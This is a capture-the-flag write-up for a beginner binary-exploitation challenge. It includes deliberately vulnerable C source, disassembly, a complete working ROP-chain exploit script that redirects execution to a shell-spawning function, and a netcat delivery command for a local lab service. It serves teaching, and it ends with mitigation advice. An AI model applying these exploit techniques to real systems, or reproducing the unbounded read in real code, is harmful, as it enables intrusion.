# R0P_Me — Solution Writeup

**Challenge:** R0P_Me  
**Difficulty:** Medium  
**Category:** Pwn / Binary Exploitation  
**Technique:** Stack Buffer Overflow / ret2win / ROP  
**Binary:** `r0p_me`  
**Port:** `1340`

---

## 1. Challenge Overview

R0P_Me is a beginner-level binary exploitation challenge that introduces players to controlling function arguments through a Return-Oriented Programming (ROP) chain.

The program contains a stack-based buffer overflow. By providing more input than the destination buffer can hold, an attacker can overwrite the saved return address and redirect execution to existing executable code.

However, this challenge adds an extra requirement: the target function, `win()`, accepts an argument and only continues when that argument matches a specific value.

Simply redirecting execution to `win()` is therefore insufficient. The exploit must also prepare the correct register before entering the function.

The intended solution combines three fundamental techniques:

1. **Stack buffer overflow:** overwrite the saved return address.
2. **ROP gadget execution:** use `pop rdi; ret` to control a register.
3. **ret2win:** redirect execution to the existing `win()` function with the correct argument.

The final payload is a short ROP chain that sets up the first function argument, adjusts stack alignment, and transfers execution to the target function.

## 2. Understanding the Source Code

The challenge's source code is:

```c
#include <stdio.h>
#include <unistd.h>

void win(unsigned long magic)
{
    if (magic != 0x13371337)
        return;

    puts("Correct!");
    system("/bin/bash -i");
}

void __attribute__((naked)) gadget_pop_rdi(void)
{
    asm("pop %rdi; ret");
}

void vulnerable(void)
{
    char buffer[64];
    read(0, buffer, 256);
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    vulnerable();
    return 0;
}
```

Players receive the compiled binary rather than the source code. The source is included here to explain the vulnerability and intended exploitation path.

### 2.1 The vulnerable function

```c
void vulnerable(void)
{
    char buffer[64];
    read(0, buffer, 256);
}
```

The function allocates a local buffer of 64 bytes on the stack.

The `read()` function takes three arguments:

```c
read(file_descriptor, destination, maximum_bytes);
```

In this case:

- `0` is standard input.
- `buffer` is the destination.
- `256` is the maximum number of bytes requested.

The problem is that `read()` can write up to 256 bytes into a buffer that only has space for 64 bytes.

There is no bounds check preventing an oversized input from overwriting adjacent stack data.

This creates a **stack-based buffer overflow**.

### 2.2 The target function

```c
void win(unsigned long magic)
{
    if (magic != 0x13371337)
        return;

    puts("Correct!");
    system("/bin/bash -i");
}
```

The `win()` function is the intended target.

It accepts one unsigned integer argument named `magic` and compares it against the constant `0x13371337`.

If the argument is incorrect, the function returns immediately.

If the argument is correct, it prints:

```text
Correct!
```

It then executes:

```c
system("/bin/bash -i");
```

This attempts to start an interactive Bash shell.

The exploit must therefore accomplish two things:

1. Redirect execution to `win()`.
2. Ensure that the function receives `0x13371337` as its argument.

The second requirement distinguishes R0P_Me from a basic ret2win challenge.

### 2.3 The provided ROP gadget

The source includes the following function:

```c
void __attribute__((naked)) gadget_pop_rdi(void)
{
    asm("pop %rdi; ret");
}
```

The `naked` attribute tells the compiler to omit the usual function prologue and epilogue, allowing the intended instruction sequence to be exposed directly.

The instructions are:

```asm
pop rdi
ret
```

The first instruction pops an eight-byte value from the stack into the `RDI` register.

The second instruction pops the next eight-byte value from the stack and uses it as the next instruction address.

This sequence is useful for building a ROP chain because it allows an attacker to set a register and then continue execution at another address.

---

## 3. Binary Reconnaissance

The first step is to inspect the provided executable.

### 3.1 Identify the binary format

Run:

```bash
file r0p_me
```

This reveals information such as the architecture and executable format.

The challenge targets Linux on x86-64, so the exploit uses 64-bit addresses, eight-byte stack values, and the System V AMD64 calling convention.

### 3.2 Inspect binary protections

Run:

```bash
checksec --file=r0p_me
```

The intended configuration is:

| Protection | Expected configuration | Relevance |
|---|---|---|
| Architecture | x86-64 | Determines register and calling-convention behavior |
| Stack canary | Absent | No canary check detects the overwrite |
| PIE | Disabled | Main executable addresses are predictable |
| NX | Enabled | The exploit reuses existing instructions |
| RELRO | Partial or full | Not central to this exploit |

Verify the actual output against the deployed binary. These properties depend on how the executable was compiled.

NX does not prevent this attack because the exploit does not inject and execute new code. Instead, it reuses instructions already present in executable memory.

With PIE disabled, the target function and gadget have predictable addresses in this binary.

### 3.3 Locate the target function and gadget

List the available symbols:

```bash
nm -n r0p_me
```

Or inspect the disassembly:

```bash
objdump -d -M intel r0p_me
```

The relevant symbols in the provided build are:

```text
0000000000401156 <win>
000000000040118a <gadget_pop_rdi>
000000000040118f <vulnerable>
00000000004011b0 <main>
```

The addresses used in this writeup are:

| Component | Address |
|---|---|
| `win()` | `0x401156` |
| `gadget_pop_rdi` | `0x40118a` |
| `ret` instruction inside the gadget | `0x40118b` |
| `vulnerable()` | `0x40118f` |

These addresses are specific to the provided binary. If a different executable is used, retrieve the addresses from that build rather than assuming they remain unchanged.

### 3.4 Inspect the target function

Run:

```bash
objdump -d -M intel --disassemble=win r0p_me
```

The relevant instructions are:

```asm
0000000000401156 <win>:
  401156: 55                    push   rbp
  401157: 48 89 e5              mov    rbp,rsp
  40115a: 48 83 ec 10           sub    rsp,0x10
  40115e: 48 89 7d f8           mov    QWORD PTR [rbp-0x8],rdi
  401162: 48 81 7d f8 37 13 37  cmp    QWORD PTR [rbp-0x8],0x13371337
  401169: 13
  40116a: 75 1b                 jne    401187
```

The function saves the incoming `RDI` value into a local stack variable and compares it against `0x13371337`.

If the value is incorrect, execution jumps to the function's return sequence.

If it is correct, execution continues to the output and shell-spawning code.

### 3.5 Inspect the gadget

The relevant disassembly is:

```asm
000000000040118a <gadget_pop_rdi>:
  40118a: 5f                    pop    rdi
  40118b: c3                    ret
  40118c: 90                    nop
  40118d: 0f 0b                 ud2
```

The gadget starts at `0x40118a`.

The standalone `ret` instruction at `0x40118b` is also a valid gadget address. It can be used independently to adjust the stack by one eight-byte slot.

This distinction becomes important when constructing the final payload.

---

## 4. Understanding the Stack Overflow

Before constructing the ROP chain, we need to determine the number of bytes required to reach the saved return address.

### 4.1 The stack frame

The disassembly of `vulnerable()` contains:

```asm
40118f: push rbp
401190: mov rbp,rsp
401193: sub rsp,0x40
401197: lea rax,[rbp-0x40]
```

The instruction `sub rsp,0x40` reserves 64 bytes for the local buffer.

The instruction `lea rax,[rbp-0x40]` calculates the buffer's address.

The stack frame is therefore arranged as follows:

```text
Higher memory addresses
+------------------------------+
| Saved return address (RIP)   |  8 bytes
+------------------------------+
| Saved frame pointer (RBP)    |  8 bytes
+------------------------------+
|                              |
| buffer[64]                   |  64 bytes
|                              |
+------------------------------+
Lower memory addresses
```

The distance from the start of the buffer to the saved return address is:

\[
64 + 8 = 72\text{ bytes}
\]

Therefore, the padding required to reach the saved return address is **72 bytes**.

### 4.2 Why overwriting the return address works

When a function is called, a return address is placed on the stack. It identifies where execution should continue when the function returns.

At the end of `vulnerable()`, the disassembly shows:

```asm
4011ae: leave
4011af: ret
```

The `leave` instruction restores the stack frame, and `ret` transfers execution to the address stored on the stack.

Because the buffer overflow can overwrite that saved address, an attacker can replace it with the address of the gadget.

Instead of returning normally, `vulnerable()` will begin executing the chosen instruction sequence.

### 4.3 Confirming the offset with GDB

Start GDB:

```bash
gdb ./r0p_me
```

Inspect the vulnerable function:

```gdb
disassemble vulnerable
```

Set a breakpoint and run the program:

```gdb
break vulnerable
run
```

Inspect the registers:

```gdb
info registers rip rsp rbp
```

You can then test progressively longer inputs or use a cyclic pattern to identify the exact overwrite offset.

For a preliminary test:

```bash
python3 -c 'print("A" * 80)' | ./r0p_me
```

A crash alone does not prove that the return address was overwritten at the intended offset. Inspect the stack or use a cyclic pattern to confirm the exact position.

For the provided binary, the intended offset is 72 bytes.

---

## 5. Understanding the x86-64 Calling Convention

The System V AMD64 calling convention specifies how functions receive their arguments on Linux x86-64.

For the first six integer or pointer arguments, the registers are:

| Argument | Register |
|---|---|
| First | `RDI` |
| Second | `RSI` |
| Third | `RDX` |
| Fourth | `RCX` |
| Fifth | `R8` |
| Sixth | `R9` |

Additional arguments are generally passed on the stack.

The target function accepts one argument:

```c
void win(unsigned long magic);
```

Therefore, the expected value must be in `RDI` when `win()` begins executing.

Conceptually, a normal function call:

```c
win(0x13371337);
```

arranges for `RDI` to contain `0x13371337` before entering the function.

The vulnerable program never makes this call. The exploit must reproduce the relevant register setup itself.

### 5.1 Why jumping directly to `win()` is insufficient

Suppose we overwrite the saved return address with `0x401156`, the address of `win()`.

Execution may reach the function, but the value in `RDI` is not guaranteed to equal `0x13371337`.

The function checks:

```c
if (magic != 0x13371337)
    return;
```

If the argument is incorrect, the function returns without spawning a shell.

Controlling `RIP` determines where execution goes. It does not automatically determine which arguments the target function receives.

This is why the exploit must use an additional gadget before entering `win()`.

---

## 6. Building the ROP Chain

A ROP chain arranges addresses and data on the stack so that successive `ret` instructions transfer execution through existing code.

For R0P_Me, the chain is deliberately short.

### 6.1 The intended execution sequence

The desired control flow is:

```text
vulnerable()
    |
    | function returns
    v
pop rdi; ret          @ 0x40118a
    |
    | pop 0x13371337 into RDI
    v
ret                   @ 0x40118b
    |
    | pop the next address into RIP
    v
win()                 @ 0x401156
    |
    | argument check succeeds
    v
puts("Correct!")
    |
    v
system("/bin/bash -i")
```

The extra `ret` at `0x40118b` is included in the tested payload to adjust stack alignment before entering `win()`.

### 6.2 Payload layout

The complete payload consists of:

```text
+-----------------------------------+
| Padding: 72 bytes                 |
+-----------------------------------+
| Address of pop rdi; ret            |
+-----------------------------------+
| Magic value: 0x13371337            |
+-----------------------------------+
| Address of standalone ret          |
+-----------------------------------+
| Address of win()                   |
+-----------------------------------+
```

Each address and the magic value occupies eight bytes.

The components have the following purposes:

1. **72 bytes of padding:** reach and overwrite the saved return address.
2. **`0x40118a`:** execute `pop rdi; ret`.
3. **`0x13371337`:** load the expected argument into `RDI`.
4. **`0x40118b`:** execute a standalone `ret` to adjust the stack alignment.
5. **`0x401156`:** transfer execution to `win()`.

### 6.3 Why the order matters

When the gadget executes `pop rdi`, it consumes the next eight-byte value on the stack.

That value must be the magic number, not the target function's address.

After the `pop`, the gadget's `ret` consumes the next stack entry. In this payload, that entry is the address of the standalone `ret` gadget.

The standalone `ret` then consumes the address of `win()`.

Each instruction consumes a different stack entry. Placing the values in the wrong order causes the CPU to load the wrong register value or jump to the wrong location.

---

## 7. Stack Alignment and the Extra `ret` Gadget

Stack alignment is an important detail in x86-64 exploitation.

The System V AMD64 ABI specifies a 16-byte stack alignment requirement at function-call boundaries. Under the usual convention, immediately before a `call` instruction, `RSP` is aligned to 16 bytes. Since `call` pushes an eight-byte return address, the callee normally begins with:

\[
RSP \bmod 16 = 8
\]

A normal compiler-generated function call establishes this alignment automatically.

A ROP chain does not necessarily preserve it.

### 7.1 Why alignment matters in this challenge

The target function's prologue is:

```asm
401156: push rbp
401157: mov rbp,rsp
40115a: sub rsp,0x10
```

The function then calls two library functions:

```asm
401171: call puts@plt
...
401180: call system@plt
```

If `win()` is entered with an unexpected stack alignment, the calls it makes may execute with an alignment that differs from the ABI's expectation.

Some library implementations use instructions that assume suitable stack alignment. Incorrect alignment can therefore cause a crash even when the overflow and argument setup are correct.

This is one reason an exploit can reach a target function successfully but fail later inside a library call.

### 7.2 The standalone `ret` in this binary

The gadget disassembly contains:

```asm
000000000040118a <gadget_pop_rdi>:
  40118a: pop rdi
  40118b: ret
```

The instruction at `0x40118b` is the `ret` instruction inside `gadget_pop_rdi`. It is a valid address at which to begin execution, so it can also be used as a standalone gadget.

A `ret` instruction consumes an eight-byte stack value and transfers execution to that address. Consequently, using an additional `ret` advances the stack by another eight bytes and flips its alignment modulo 16.

The chain becomes:

```text
Padding (72 bytes)
    |
    v
pop rdi; ret          @ 0x40118a
    |
    v
0x13371337            -> RDI
    |
    v
ret                   @ 0x40118b
    |
    v
win()                 @ 0x401156
```

The standalone `ret` does not set an argument or perform useful computation. Its purpose is to adjust the stack position before entering the target function.

### 7.3 The tested payload with alignment adjustment

The payload used successfully against the provided binary is:

```python
import sys

payload = (
    b"A" * 72
    + b"\x8a\x11\x40\x00\x00\x00\x00\x00"  # pop rdi; ret
    + b"\x37\x13\x37\x13\x00\x00\x00\x00"  # magic argument
    + b"\x8b\x11\x40\x00\x00\x00\x00\x00"  # standalone ret
    + b"\x56\x11\x40\x00\x00\x00\x00\x00"  # win()
)

sys.stdout.buffer.write(payload)
```

The additional `ret` is part of the tested working chain for this binary.

### 7.4 How to verify alignment rather than guess

If an exploit crashes after reaching `win()`, inspect the state at the function entry and at the failing library call.

For example:

```gdb
break win
run < payload.bin
info registers rsp rbp rdi
```

If you want to save the payload for debugging, generate it into a file instead of writing it directly to standard output.

At the entry to `win()`, check:

```gdb
p/x $rsp
p/x $rsp & 0xf
```

At ordinary function entry under the System V AMD64 convention, the expected value of `RSP & 0xf` is `8`.

You can also step through the prologue and inspect `RSP` immediately before the calls to `puts()` and `system()`.

**Do not assume that every ROP chain requires an extra `ret`.** Whether it is needed depends on the actual stack position when the target is entered. Calculate the alignment and confirm the behavior of the specific binary.

---

## 8. Constructing the Exploit

Python is convenient for generating binary payloads because it preserves arbitrary bytes and makes it easy to encode addresses.

### 8.1 Little-endian encoding

On x86-64 Linux, values are normally represented in little-endian byte order.

For example:

```text
0x40118a
```

is encoded as:

```text
8a 11 40 00 00 00 00 00
```

Likewise:

```text
0x13371337
```

is represented as an eight-byte integer:

```text
37 13 37 13 00 00 00 00
```

Python's `struct.pack("<Q", value)` handles this automatically.

The `<Q` format means an unsigned 64-bit integer in little-endian byte order.

### 8.2 Complete exploit script

Create a file named `exploit.py`:

```python
import struct
import sys

offset = 72

gadget_pop_rdi = 0x40118a
magic = 0x13371337
ret = 0x40118b
win = 0x401156

payload = b"A" * offset
payload += struct.pack("<Q", gadget_pop_rdi)
payload += struct.pack("<Q", magic)
payload += struct.pack("<Q", ret)
payload += struct.pack("<Q", win)

sys.stdout.buffer.write(payload)
```

This script creates the exact payload structure:

```text
72 bytes of padding
+ gadget_pop_rdi
+ magic value
+ standalone ret
+ win()
```

The addresses correspond to the binary shown in this writeup. If the binary is rebuilt and its addresses change, update the script accordingly.

### 8.3 Test locally

Run:

```bash
python3 exploit.py | ./r0p_me
```

If the ROP chain succeeds, the program should print:

```text
Correct!
```

The shell may immediately exit if the payload's input stream has reached EOF. This does not necessarily indicate that the ROP chain failed.

### 8.4 Keep the shell's input open

To interact with the shell, keep standard input open after sending the payload:

```bash
(python3 exploit.py; cat) | ./r0p_me
```

The Python script writes the payload, and `cat` continues forwarding input to the program.

Once the shell starts, test it with:

```bash
id
```

or:

```bash
pwd
```

The commands help confirm that you have an interactive shell.

---

## 9. Exploiting the Remote Service

The challenge is exposed over TCP on port `1340`.

Connect directly with:

```bash
nc localhost 1340
```

To send the payload and keep standard input available:

```bash
(python3 exploit.py; cat) | nc localhost 1340
```

This command combines three behaviors:

1. `python3 exploit.py` generates the binary payload.
2. `cat` keeps reading user input and forwarding it through the pipe.
3. `nc` transmits the resulting stream to the service.

The trailing `cat` is important because a shell needs continued input after the initial payload has been delivered.

A remote shell may not have a proper TTY, so some terminal features might be unavailable even when exploitation succeeds.

If the local exploit works but the remote exploit fails, verify that both environments use the same binary and that the service forwards the input correctly.

---

## 10. Troubleshooting

### 10.1 The program crashes before printing `Correct!`

Possible causes include:

- An incorrect offset to the saved return address.
- An incorrect gadget address.
- An incorrect target address.
- An incorrectly encoded payload.
- A binary that differs from the one used to develop the exploit.

Use GDB to inspect the crash location, `RIP`, `RSP`, and the stack contents.

### 10.2 The program reaches `win()` but does not spawn a shell

Inspect `RDI` at the beginning of `win()`:

```gdb
break win
run
info registers rdi
```

The expected value is:

```text
0x13371337
```

If the value is wrong, examine the chain's stack layout and confirm that the `pop rdi` instruction consumes the magic value.

### 10.3 The program prints `Correct!` but the connection closes

The chain may have succeeded, but the shell may be receiving EOF.

Use the `cat` pattern described above to keep standard input open.

Also verify that the server does not terminate the process immediately after the original vulnerable program returns.

### 10.4 The program crashes inside `puts()` or `system()`

Check stack alignment and inspect the instructions immediately preceding the failing call.

The extra `ret` gadget may correct an alignment problem, but it should not be added blindly. Confirm the actual value of `RSP` and distinguish alignment issues from incorrect arguments, invalid addresses, or other faults.

### 10.5 The local exploit works but the remote exploit fails

Verify:

- The local and remote binaries match.
- The target and gadget addresses are correct.
- The saved return address offset is unchanged.
- The server forwards the entire payload.
- The shell's standard input remains available.
- The service does not terminate the process prematurely.

These checks help distinguish a payload problem from a deployment problem.

---

## 11. Why This Is a ROP Challenge

R0P_Me uses a small ROP chain rather than a long sequence of gadgets.

The exploit reuses existing executable instructions instead of injecting shellcode:

```asm
pop rdi
ret
```

The gadget loads the desired value into `RDI`, and the chain then transfers execution to the existing `win()` function.

This introduces the central idea of Return-Oriented Programming: existing instruction sequences can be combined to perform operations that the program was not designed to perform.

The challenge avoids more advanced requirements such as address leaks, multi-stage chains, syscall-oriented programming, and complicated register setups.

The supplied gadget keeps the focus on stack layout, calling conventions, and control-flow redirection.

## 12. Security Lessons

The vulnerability exists because the program requests more input than the local buffer can hold.

A safer implementation would restrict the read length:

```c
void vulnerable(void)
{
    char buffer[64];
    read(0, buffer, sizeof(buffer));
}
```

This prevents this particular call from writing more than 64 bytes into the buffer. Real applications should also check the return value and handle input according to their protocol.

Additional mitigations can make exploitation harder:

- **Stack canaries** detect many stack-buffer-overflow attempts before the function returns.
- **PIE and ASLR** make code addresses less predictable.
- **NX** prevents execution of data pages that are not marked executable.
- **Control-flow protections** can make certain forms of return-address manipulation harder.

No single mitigation replaces proper bounds checking.

The key lesson is that an input-handling mistake can compromise program control flow, potentially turning a simple memory corruption bug into remote shell access.

## 13. Final Exploit Summary

The intended exploit follows these steps:

| Step | Action | Purpose |
|---|---|---|
| 1 | Inspect the binary | Locate the target and gadget |
| 2 | Determine the overflow offset | Reach the saved return address |
| 3 | Execute `pop rdi; ret` | Control the first function argument |
| 4 | Load `0x13371337` | Satisfy the target's argument check |
| 5 | Execute the standalone `ret` | Adjust stack alignment |
| 6 | Enter `win()` | Reach the target function |
| 7 | Keep standard input open | Interact with the spawned shell |

The final payload structure is:

```text
"A" * 72
+ p64(0x40118a)       # pop rdi; ret
+ p64(0x13371337)     # magic argument
+ p64(0x40118b)       # standalone ret
+ p64(0x401156)       # win()
```

The critical insight is that successful exploitation requires control over both **where execution goes** and **the argument expected by the destination function**. Stack alignment is an additional consideration when entering compiled functions through a ROP chain.

---

## 14. Author Notes

R0P_Me follows the introductory challenges in the 0XATTACK pwn series:

- **Oopsie:** Understand the fundamentals of stack buffer overflows.
- **Returnal:** Overwrite the saved return address and reach an existing function.
- **R0P_Me:** Use a ROP gadget to control a function argument before reaching the target.

The challenge is intended to remain beginner-friendly. The supplied `pop rdi; ret` gadget avoids the need to search for a suitable gadget elsewhere in the binary while still teaching the essential ROP concepts.

For deployment, verify that the distributed binary matches the tested build, the service uses the correct port, and the spawned shell receives input as expected.

The flag should be available through the intended challenge environment and should not be accidentally exposed in the public source files.

**End of solution.**